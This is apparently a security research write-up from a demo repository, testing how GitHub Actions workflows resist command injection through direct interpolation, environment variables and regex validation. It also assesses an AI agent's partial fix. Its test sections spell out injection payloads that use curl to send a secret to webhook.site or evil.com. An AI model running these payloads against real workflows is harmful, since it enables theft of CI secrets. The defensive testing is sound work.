# Research Findings: GitHub Actions Security

This document summarizes what we learned from creating and testing this demonstration repository.

---

## The Question

**Does using environment variables instead of direct `${{ }}` interpolation actually improve security?**

---

## Initial Belief

Many believed that moving from direct interpolation to environment variables provides little to no security benefit, that it's merely a stylistic change.

---

## What We Discovered

After hands-on testing and reviewing GitHub's official documentation, we found:

### ✅ Environment Variables DO Provide Security Benefits

1. **It's officially documented** - GitHub's security hardening guide explicitly recommends using environment variables
2. **It does prevent command injection** - Command substitution like `$(curl ...)` executes with direct interpolation but NOT with environment variables
3. **But it's not sufficient alone** - Input validation is still required for complete security

---

## Test Results

### Test 1: Direct Interpolation with Command Substitution

**Workflow:**
```yaml
run: git checkout -b "update-${{ inputs.package_name }}"
```

**Malicious Input:** `$(curl https://webhook.site/test?secret=$DEMO_SECRET)`

**Result:**
✅ **Command executed**
✅ Curl ran and sent request
✅ Secret exfiltrated to webhook
✅ **VULNERABLE**

---

### Test 2: Environment Variables with Same Input

**Workflow:**
```yaml
run: git checkout -b "update-${PACKAGE_NAME}"
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
```

**Malicious Input:** `$(curl https://webhook.site/test?secret=$DEMO_SECRET)`

**Result:**
❌ Command did NOT execute
❌ No webhook request received
❌ Git received literal string `$(curl ...)` as branch name
✅ **PROTECTED** (but incomplete)

---

### Test 3: Environment Variables + Input Validation

**Workflow:**
```yaml
- name: Validate
  run: |
    if ! echo "$PKG" | grep -qE '^@?[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)?$'; then
      exit 1
    fi
  env:
    PKG: ${{ inputs.package_name }}
```

**Malicious Input:** `$(curl https://webhook.site/test?secret=$DEMO_SECRET)`

**Result:**
❌ Validation rejected input immediately
❌ No commands executed
❌ Clear error message shown
✅ **FULLY SECURE**

---

## Why Environment Variables Help

### Technical Explanation

**Direct interpolation:**
1. GitHub Actions evaluates `${{ inputs.value }}` → injects raw string into script
2. Script text becomes: `command "$(curl evil.com)"`
3. Shell parses the script and sees command substitution
4. Shell executes `$(curl evil.com)` before running the command
5. **Attack succeeds**

**Environment variables:**
1. GitHub Actions evaluates `${{ inputs.value }}` → sets environment variable
2. Variable value is: `$(curl evil.com)` (literal string)
3. Script text becomes: `command "${VAR}"`
4. Shell expands `${VAR}` → gets the literal string value
5. Command substitution is NOT re-evaluated
6. **Attack blocked**

From GitHub's documentation:
> "The value of the expression is stored in memory and used as a variable, and doesn't interact with the script generation process."

**Source:** [GitHub Docs - Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)

---

## What Doesn't Work

### Semicolon Command Chaining

**Input:** `foo"; curl https://evil.com #`

**Result on both direct and env vars:**
✅ Blocked by double quotes + git validation
Git rejects it as invalid branch name

**But:** This is defense-in-depth (git validation), not a security control. Don't rely on it.

---

## Engineering Team Assessment

The team said: *"Simply moving the expression into `env:` does not fix command injection."*

### Were They Right?

**Yes and No:**

✅ **Right** that it's not a complete fix - validation is still needed
✅ **Right** that you shouldn't rely on it alone
❌ **Incomplete** - it DOES provide significant security improvement
✅ **Right spirit** - defense-in-depth is essential

---

## The Correct Interpretation

### What the AI Agent Did

The agent moved from:
```yaml
run: command "${{ inputs.value }}"
```

To:
```yaml
run: command "${VALUE}"
env:
  VALUE: ${{ inputs.value }}
```

### Was This Wrong?

**No, it was partially correct:**
- ✅ Followed GitHub's official security guidance
- ✅ Prevented command substitution attacks
- ✅ Significantly improved security
- ❌ **But missed input validation** (the second required layer)

### What Was Missing

The complete fix requires **both:**

```yaml
# Layer 1: Input Validation
- name: Validate
  run: |
    if ! echo "$VALUE" | grep -qE '^[safe-pattern]$'; then
      exit 1
    fi
  env:
    VALUE: ${{ inputs.value }}

# Layer 2: Use Environment Variables
- name: Use Safely
  run: command "$VALUE"
  env:
    VALUE: ${{ inputs.value }}
```

---

## Security Rating: Before vs After

| Approach | Command Injection | Info Disclosure | Validation | Rating |
|----------|-------------------|-----------------|------------|--------|
| Direct `${{}}` | ❌ Vulnerable | ⚠️ High Risk | ❌ None | 🔴 **Vulnerable** |
| Env Vars Only | ✅ Protected | ⚠️ Some Risk | ❌ None | 🟡 **Improved** |
| Env Vars + Validation | ✅ Protected | ✅ Protected | ✅ Enforced | 🟢 **Secure** |

---

## Key Lessons

### For Security Engineers

1. **Test fixes, don't assume** - We thought env vars didn't help, but testing proved otherwise
2. **Read official documentation** - GitHub explicitly documents this security control
3. **Defense-in-depth always** - Environment variables AND validation, not OR
4. **Verify with attack vectors** - Test with actual malicious payloads

### For AI Agents

1. **The fix was on the right track** - Following GitHub's guidance is correct
2. **But incomplete** - Must also add input validation
3. **Test adversarially** - Should have simulated attacks to verify effectiveness
4. **Multiple security layers** - One control is never enough

### For SAST Tools

1. **Some recommendations are outdated** - Environment variables DO help
2. **Provide context** - Explain WHY the recommended fix works
3. **Emphasize defense-in-depth** - Don't suggest single-layer solutions
4. **Link to official docs** - Reference authoritative sources

---

## Recommendations

### Immediate Actions

1. ✅ **Use environment variables** for all untrusted input in workflows
2. ✅ **Add input validation** with regex whitelists
3. ✅ **Test with attack payloads** to verify fixes work
4. ✅ **Review existing workflows** for direct interpolation patterns

### Long-Term Practices

1. **Always use both controls** - Environment variables + validation
2. **Prefer safe APIs** - Use `actions/github-script` when possible
3. **Restrict workflow triggers** - Limit who can run workflows
4. **Audit regularly** - Review workflows for security issues
5. **Stay updated** - Follow GitHub's security advisories

---

## Conclusion

### The Bottom Line

**Environment variables are a documented and effective security control**, but they must be combined with input validation for complete protection.

**The engineering team was right** that environment variables alone aren't sufficient, but **they provide real security benefits** as part of a defense-in-depth strategy.

**The AI agent's fix was incomplete**, not wrong. It followed step 1 (use environment variables) but missed step 2 (add validation).

### Defense-in-Depth Formula

```
Security = Environment Variables + Input Validation + Least Privilege
```

All three layers are necessary for robust protection.

---

## References

- [GitHub Docs: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [GitHub Docs: Secure Use Reference](https://docs.github.com/en/actions/reference/security/secure-use)
- This demonstration repository with working test cases

---

**Last Updated:** November 2025
**Status:** Findings confirmed through live testing and documentation review
